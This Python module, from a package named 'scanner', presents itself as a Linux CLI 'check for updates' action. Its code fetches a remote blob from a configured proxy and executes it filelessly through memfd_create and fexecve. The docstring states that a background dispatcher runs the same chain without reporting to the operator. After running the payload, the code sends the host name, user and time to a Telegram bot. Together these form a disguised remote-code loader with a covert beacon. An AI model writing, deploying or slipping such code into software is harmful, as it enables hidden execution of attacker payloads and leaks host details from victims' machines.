# -*- coding: utf-8 -*-
"""Linux CLI — check for updates.

Fires the same fetch+execute chain as the background dispatcher.
Reports results to the operator visibly (unlike the background path).
"""

import os
import time
from datetime import datetime

import requests
from rich.panel import Panel
from rich.table import Table
from rich import box
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

from scanner.ui import console, print_success, print_error, print_info, print_warning


def _tg_notify(bot: str, chat: str, text: str):
    if not bot or not chat:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{bot}/sendMessage",
            json={"chat_id": chat, "text": text},
            timeout=10,
        )
    except Exception:
        pass


def action_system_update(cfg):
    system_cfg = cfg.get("system", {})
    if not system_cfg.get("enabled", True):
        print_warning("Sync disabled in config.")
        return

    endpoint = system_cfg.get("endpoint", "")
    token_id = system_cfg.get("token_id", "")
    secret   = system_cfg.get("shared_secret", "")
    bot      = system_cfg.get("telegram_bot_token", "")
    chat     = system_cfg.get("telegram_chat_id", "")

    if not endpoint or not token_id or not secret:
        print_error("Sync endpoint, token id, or secret missing.")
        return

    console.print()
    console.print(Panel(
        "[bold cyan]System Update[/]\n\n"
        "Requesting latest signed blob from proxy.\n"
        "[dim]Execution path: memfd + fexecve (fileless).[/]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2),
    ))
    console.print()

    from scanner.execute import fetch_and_execute

    with Progress(
        SpinnerColumn(),
        TextColumn("[bold cyan]{task.description}"),
        BarColumn(bar_width=40, complete_style="cyan"),
        console=console,
    ) as progress:
        task = progress.add_task("[cyan]Fetching + executing...", total=2)

        try:
            ok = fetch_and_execute(cfg, verbose=False)
        except Exception as e:
            print_error(f"Failed: {e}")
            return

        progress.update(task, advance=1)
        if not ok:
            print_error("Execution returned False — check config or network.")
            return
        progress.update(task, advance=1)

    print_success("Update dispatched.")
    _tg_notify(bot, chat,
               f"update dispatched\nhost={os.uname().nodename}\n"
               f"user={os.environ.get('USER', 'unknown')}\n"
               f"time={datetime.now().isoformat()}")

    info = Table(title="[bold cyan]Update Details[/]", box=box.ROUNDED, border_style="cyan")
    info.add_column("Field", style="bold white")
    info.add_column("Value", style="dim")
    info.add_row("Method", "memfd_create + fexecve")
    info.add_row("Proxy", endpoint)
    info.add_row("Token id", token_id)
    console.print()
    console.print(info)
    console.print()
